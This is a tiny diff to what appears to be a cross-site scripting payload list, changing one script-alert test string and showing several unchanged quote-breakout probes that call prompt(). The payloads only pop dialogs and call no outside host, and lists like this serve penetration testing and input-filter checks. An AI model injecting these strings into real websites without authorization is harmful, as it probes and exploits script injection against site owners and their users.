@@ -1,4 +1,4 @@
-<script>alert('All Seeing Eye')</script>
+<script>alert('Yuki')</script>
 "-prompt(8)-"
 '-prompt(8)-'
 ";a=prompt,a()//
